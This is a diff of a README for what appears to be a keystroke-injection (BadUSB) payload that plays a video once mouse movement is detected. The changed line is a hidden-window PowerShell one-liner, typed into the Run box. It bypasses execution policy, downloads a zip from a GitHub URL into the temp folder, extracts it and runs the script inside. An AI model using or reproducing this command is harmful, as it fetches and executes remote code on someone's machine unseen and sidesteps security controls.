@@ -47,7 +47,7 @@ When a mouse movement is detected that video will be played in the powershell co
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
 ```
-powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/js.zip';$Z="$env:TMP"+'\js.zip';$D="$env:TMP"+'\js';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\js\js.ps1
+powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/js.zip' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
